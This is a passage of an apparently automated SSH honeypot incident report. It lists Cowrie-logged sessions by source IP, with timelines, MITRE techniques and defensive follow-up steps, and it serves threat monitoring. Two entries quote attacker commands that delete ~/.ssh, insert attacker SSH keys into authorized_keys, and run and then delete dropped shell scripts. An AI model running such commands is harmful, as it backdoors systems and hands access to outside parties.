| `2026-08-08 13:21:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.25[.]99` to AbuseIPDB if not already reported
- [ ] Block `154.221.25[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e81208086118

| Field | Detail |
|---|---|
| **Source IP** | `154.221.25[.]99` |
| **First Seen** | 2026-08-08 13:21 |
| **Last Seen** | 2026-08-08 13:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:21:00` | `cowrie.session.connect` |
| `2026-08-08 13:21:00` | `cowrie.client.version` |
| `2026-08-08 13:21:00` | `cowrie.client.kex` |
| `2026-08-08 13:21:01` | `cowrie.login.success` |
| `2026-08-08 13:21:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.25[.]99` to AbuseIPDB if not already reported
- [ ] Block `154.221.25[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7094fb864b1a

| Field | Detail |
|---|---|
| **Source IP** | `103.125.103[.]201` |
| **First Seen** | 2026-08-08 13:24 |
| **Last Seen** | 2026-08-08 13:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:24:24` | `cowrie.session.connect` |
| `2026-08-08 13:24:24` | `cowrie.client.version` |
| `2026-08-08 13:24:25` | `cowrie.client.kex` |
| `2026-08-08 13:24:26` | `cowrie.login.success` |
| `2026-08-08 13:24:27` | `cowrie.session.params` |
| `2026-08-08 13:24:27` | `cowrie.command.input` |
| `2026-08-08 13:24:27` | `cowrie.command.failed` |
| `2026-08-08 13:24:27` | `cowrie.log.closed` |
| `2026-08-08 13:24:28` | `cowrie.session.params` |
| `2026-08-08 13:24:28` | `cowrie.command.input` |
| `2026-08-08 13:24:29` | `cowrie.session.file_download` |
| `2026-08-08 13:24:29` | `cowrie.log.closed` |
| `2026-08-08 13:24:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.125.103[.]201` to AbuseIPDB if not already reported
- [ ] Block `103.125.103[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ddcc038ec2f

| Field | Detail |
|---|---|
| **Source IP** | `103.125.103[.]201` |
| **First Seen** | 2026-08-08 13:24 |
| **Last Seen** | 2026-08-08 13:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:24:29` | `cowrie.session.connect` |
| `2026-08-08 13:24:29` | `cowrie.client.version` |
| `2026-08-08 13:24:29` | `cowrie.client.kex` |
| `2026-08-08 13:24:30` | `cowrie.login.success` |
| `2026-08-08 13:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.125.103[.]201` to AbuseIPDB if not already reported
- [ ] Block `103.125.103[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e487970cbe0

| Field | Detail |
|---|---|
| **Source IP** | `103.125.103[.]201` |
| **First Seen** | 2026-08-08 13:24 |
| **Last Seen** | 2026-08-08 13:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:24:31` | `cowrie.session.connect` |
| `2026-08-08 13:24:31` | `cowrie.client.version` |
| `2026-08-08 13:24:31` | `cowrie.client.kex` |
| `2026-08-08 13:24:32` | `cowrie.login.success` |
| `2026-08-08 13:24:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.125.103[.]201` to AbuseIPDB if not already reported
- [ ] Block `103.125.103[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1a86d0bc5d4

| Field | Detail |
|---|---|
| **Source IP** | `186.23.209[.]47` |
| **First Seen** | 2026-08-08 13:26 |
| **Last Seen** | 2026-08-08 13:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:26:38` | `cowrie.session.connect` |
| `2026-08-08 13:26:39` | `cowrie.client.version` |
| `2026-08-08 13:26:39` | `cowrie.client.kex` |
| `2026-08-08 13:26:41` | `cowrie.login.success` |
| `2026-08-08 13:26:41` | `cowrie.direct-tcpip.request` |
| `2026-08-08 13:26:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.23.209[.]47` to AbuseIPDB if not already reported
- [ ] Block `186.23.209[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e29931c776f

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]170` |
| **First Seen** | 2026-08-08 13:29 |
| **Last Seen** | 2026-08-08 13:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:29:52` | `cowrie.session.connect` |
| `2026-08-08 13:29:53` | `cowrie.client.version` |
| `2026-08-08 13:29:53` | `cowrie.client.kex` |
| `2026-08-08 13:29:54` | `cowrie.login.success` |
| `2026-08-08 13:29:55` | `cowrie.direct-tcpip.request` |
| `2026-08-08 13:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]170` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9f7efa05cd4

| Field | Detail |
|---|---|
| **Source IP** | `144.22.210[.]132` |
| **First Seen** | 2026-08-08 13:33 |
| **Last Seen** | 2026-08-08 13:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:33:47` | `cowrie.session.connect` |
| `2026-08-08 13:33:48` | `cowrie.client.version` |
| `2026-08-08 13:33:48` | `cowrie.client.kex` |
| `2026-08-08 13:33:50` | `cowrie.login.success` |
| `2026-08-08 13:33:50` | `cowrie.direct-tcpip.request` |
| `2026-08-08 13:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.210[.]132` to AbuseIPDB if not already reported
- [ ] Block `144.22.210[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-798db6267ac1

| Field | Detail |
|---|---|
| **Source IP** | `65.49.1[.]162` |
| **First Seen** | 2026-08-08 13:36 |
| **Last Seen** | 2026-08-08 13:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/101.0.4951.41 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:36:23` | `cowrie.session.connect` |
| `2026-08-08 13:36:23` | `cowrie.login.success` |
| `2026-08-08 13:36:24` | `cowrie.session.params` |
| `2026-08-08 13:36:24` | `cowrie.command.input` |
| `2026-08-08 13:36:24` | `cowrie.command.input` |
| `2026-08-08 13:36:24` | `cowrie.command.failed` |
| `2026-08-08 13:36:24` | `cowrie.command.input` |
| `2026-08-08 13:36:24` | `cowrie.command.failed` |
| `2026-08-08 13:36:24` | `cowrie.command.input` |
| `2026-08-08 13:36:24` | `cowrie.log.closed` |
| `2026-08-08 13:36:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.49.1[.]162` to AbuseIPDB if not already reported
- [ ] Block `65.49.1[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-632d05cb61da

| Field | Detail |
|---|---|
| **Source IP** | `180.71.9[.]31` |
| **First Seen** | 2026-08-08 13:39 |
| **Last Seen** | 2026-08-08 13:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:39:01` | `cowrie.session.connect` |
| `2026-08-08 13:39:02` | `cowrie.client.version` |
| `2026-08-08 13:39:02` | `cowrie.client.kex` |
| `2026-08-08 13:39:04` | `cowrie.login.success` |
| `2026-08-08 13:39:05` | `cowrie.direct-tcpip.request` |
| `2026-08-08 13:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.71.9[.]31` to AbuseIPDB if not already reported
- [ ] Block `180.71.9[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e465f1af817

| Field | Detail |
|---|---|
| **Source IP** | `163.177.76[.]83` |
| **First Seen** | 2026-08-08 13:40 |
| **Last Seen** | 2026-08-08 13:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:40:17` | `cowrie.session.connect` |
| `2026-08-08 13:40:17` | `cowrie.client.version` |
| `2026-08-08 13:40:18` | `cowrie.client.kex` |
| `2026-08-08 13:40:19` | `cowrie.login.success` |
| `2026-08-08 13:40:20` | `cowrie.session.params` |
| `2026-08-08 13:40:20` | `cowrie.command.input` |
| `2026-08-08 13:40:20` | `cowrie.log.closed` |
| `2026-08-08 13:40:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.177.76[.]83` to AbuseIPDB if not already reported
- [ ] Block `163.177.76[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-294d88bee70c

| Field | Detail |
|---|---|
| **Source IP** | `41.178.230[.]115` |
| **First Seen** | 2026-08-08 13:53 |
| **Last Seen** | 2026-08-08 13:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:53:34` | `cowrie.session.connect` |
| `2026-08-08 13:53:34` | `cowrie.client.version` |
| `2026-08-08 13:53:34` | `cowrie.client.kex` |
| `2026-08-08 13:53:35` | `cowrie.login.success` |
| `2026-08-08 13:53:35` | `cowrie.direct-tcpip.request` |
| `2026-08-08 13:53:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.178.230[.]115` to AbuseIPDB if not already reported
- [ ] Block `41.178.230[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d31f78051bf8

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 13:55 |
| **Last Seen** | 2026-08-08 13:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:55:48` | `cowrie.session.connect` |
| `2026-08-08 13:55:48` | `cowrie.client.version` |
| `2026-08-08 13:55:48` | `cowrie.client.kex` |
| `2026-08-08 13:55:48` | `cowrie.login.success` |
| `2026-08-08 13:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e42f0dc98864

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 13:55 |
| **Last Seen** | 2026-08-08 13:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:55:48` | `cowrie.session.connect` |
| `2026-08-08 13:55:48` | `cowrie.client.version` |
| `2026-08-08 13:55:48` | `cowrie.client.kex` |
| `2026-08-08 13:55:48` | `cowrie.login.success` |
| `2026-08-08 13:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fd5c37456a9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 13:55 |
| **Last Seen** | 2026-08-08 13:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:55:53` | `cowrie.session.connect` |
| `2026-08-08 13:55:53` | `cowrie.client.version` |
| `2026-08-08 13:55:53` | `cowrie.client.kex` |
| `2026-08-08 13:55:53` | `cowrie.login.success` |
| `2026-08-08 13:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adc186304d44

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 13:55 |
| **Last Seen** | 2026-08-08 13:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:55:53` | `cowrie.session.connect` |
| `2026-08-08 13:55:53` | `cowrie.client.version` |
| `2026-08-08 13:55:53` | `cowrie.client.kex` |
| `2026-08-08 13:55:53` | `cowrie.login.success` |
| `2026-08-08 13:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24489f7ef0ef

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-08-08 14:00 |
| **Last Seen** | 2026-08-08 14:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:00:44` | `cowrie.session.connect` |
| `2026-08-08 14:00:45` | `cowrie.client.version` |
| `2026-08-08 14:00:45` | `cowrie.client.kex` |
| `2026-08-08 14:00:47` | `cowrie.login.success` |
| `2026-08-08 14:00:48` | `cowrie.direct-tcpip.request` |
| `2026-08-08 14:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11cd2b7bc14e

| Field | Detail |
|---|---|
| **Source IP** | `81.237.155[.]113` |
| **First Seen** | 2026-08-08 14:08 |
| **Last Seen** | 2026-08-08 14:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:08:35` | `cowrie.session.connect` |
| `2026-08-08 14:08:35` | `cowrie.client.version` |
| `2026-08-08 14:08:35` | `cowrie.client.kex` |
| `2026-08-08 14:08:36` | `cowrie.login.success` |
| `2026-08-08 14:08:36` | `cowrie.direct-tcpip.request` |
| `2026-08-08 14:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.237.155[.]113` to AbuseIPDB if not already reported
- [ ] Block `81.237.155[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-385bd8bcef6e

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]124` |
| **First Seen** | 2026-08-08 14:14 |
| **Last Seen** | 2026-08-08 14:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:14:00` | `cowrie.session.connect` |
| `2026-08-08 14:14:01` | `cowrie.client.version` |
| `2026-08-08 14:14:01` | `cowrie.client.kex` |
| `2026-08-08 14:14:03` | `cowrie.login.success` |
| `2026-08-08 14:14:04` | `cowrie.direct-tcpip.request` |
| `2026-08-08 14:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]124` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]124` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2a948176855

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-08 14:27 |
| **Last Seen** | 2026-08-08 14:28 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `X="chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgB` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:27:55` | `cowrie.session.connect` |
| `2026-08-08 14:27:55` | `cowrie.client.version` |
| `2026-08-08 14:27:55` | `cowrie.client.kex` |
| `2026-08-08 14:27:56` | `cowrie.login.success` |
| `2026-08-08 14:28:22` | `cowrie.session.params` |
| `2026-08-08 14:28:22` | `cowrie.command.input` |
| `2026-08-08 14:28:22` | `cowrie.command.failed` |
| `2026-08-08 14:28:22` | `cowrie.command.failed` |
| `2026-08-08 14:28:22` | `cowrie.command.failed` |
| `2026-08-08 14:28:22` | `cowrie.command.failed` |
| `2026-08-08 14:28:22` | `cowrie.command.failed` |
| `2026-08-08 14:28:22` | `cowrie.command.failed` |
| `2026-08-08 14:28:22` | `cowrie.command.failed` |
| `2026-08-08 14:28:22` | `cowrie.command.failed` |
| `2026-08-08 14:28:22` | `cowrie.command.failed` |
| `2026-08-08 14:28:22` | `cowrie.log.closed` |
| `2026-08-08 14:28:22` | `cowrie.session.file_upload` |
| `2026-08-08 14:28:22` | `cowrie.session.file_upload` |
| `2026-08-08 14:28:22` | `cowrie.session.file_upload` |
| `2026-08-08 14:28:22` | `cowrie.session.file_upload` |
| `2026-08-08 14:28:22` | `cowrie.session.file_upload` |
| `2026-08-08 14:28:22` | `cowrie.session.file_upload` |
| `2026-08-08 14:28:22` | `cowrie.session.file_upload` |
| `2026-08-08 14:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3f0741594d8

| Field | Detail |
|---|---|
| **Source IP** | `59.95.137[.]238` |
| **First Seen** | 2026-08-08 14:35 |
| **Last Seen** | 2026-08-08 14:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:35:10` | `cowrie.session.connect` |
| `2026-08-08 14:35:11` | `cowrie.client.version` |
| `2026-08-08 14:35:11` | `cowrie.client.kex` |
| `2026-08-08 14:35:13` | `cowrie.login.success` |
| `2026-08-08 14:35:13` | `cowrie.direct-tcpip.request` |
| `2026-08-08 14:35:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.95.137[.]238` to AbuseIPDB if not already reported
- [ ] Block `59.95.137[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-463747bc68d6

| Field | Detail |
|---|---|
| **Source IP** | `58.57.154[.]146` |
| **First Seen** | 2026-08-08 14:35 |
| **Last Seen** | 2026-08-08 14:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:35:20` | `cowrie.session.connect` |
| `2026-08-08 14:35:21` | `cowrie.client.version` |
| `2026-08-08 14:35:21` | `cowrie.client.kex` |
| `2026-08-08 14:35:23` | `cowrie.login.success` |
| `2026-08-08 14:35:24` | `cowrie.direct-tcpip.request` |
| `2026-08-08 14:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.57.154[.]146` to AbuseIPDB if not already reported
- [ ] Block `58.57.154[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d71a4bfda054

| Field | Detail |
|---|---|
| **Source IP** | `189.52.52[.]162` |
| **First Seen** | 2026-08-08 14:39 |
| **Last Seen** | 2026-08-08 14:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:39:06` | `cowrie.session.connect` |
| `2026-08-08 14:39:06` | `cowrie.client.version` |
| `2026-08-08 14:39:06` | `cowrie.client.kex` |
| `2026-08-08 14:39:08` | `cowrie.login.success` |
| `2026-08-08 14:39:09` | `cowrie.direct-tcpip.request` |
| `2026-08-08 14:39:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.52.52[.]162` to AbuseIPDB if not already reported
- [ ] Block `189.52.52[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43ed00e7f855

| Field | Detail |
|---|---|
| **Source IP** | `60.171.135[.]254` |
| **First Seen** | 2026-08-08 14:43 |
| **Last Seen** | 2026-08-08 14:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:43:25` | `cowrie.session.connect` |
| `2026-08-08 14:43:26` | `cowrie.client.version` |
| `2026-08-08 14:43:26` | `cowrie.client.kex` |
| `2026-08-08 14:43:29` | `cowrie.login.success` |
| `2026-08-08 14:43:30` | `cowrie.direct-tcpip.request` |
| `2026-08-08 14:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.171.135[.]254` to AbuseIPDB if not already reported
- [ ] Block `60.171.135[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6a600c3e8cb

| Field | Detail |
|---|---|
| **Source IP** | `167.172.108[.]50` |
| **First Seen** | 2026-08-08 14:45 |
| **Last Seen** | 2026-08-08 14:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:45:56` | `cowrie.session.connect` |
| `2026-08-08 14:45:56` | `cowrie.login.success` |
| `2026-08-08 14:45:56` | `cowrie.session.params` |
| `2026-08-08 14:45:56` | `cowrie.command.input` |
| `2026-08-08 14:45:56` | `cowrie.command.failed` |
| `2026-08-08 14:45:56` | `cowrie.command.input` |
| `2026-08-08 14:45:56` | `cowrie.command.failed` |
| `2026-08-08 14:45:56` | `cowrie.command.input` |
| `2026-08-08 14:45:56` | `cowrie.log.closed` |
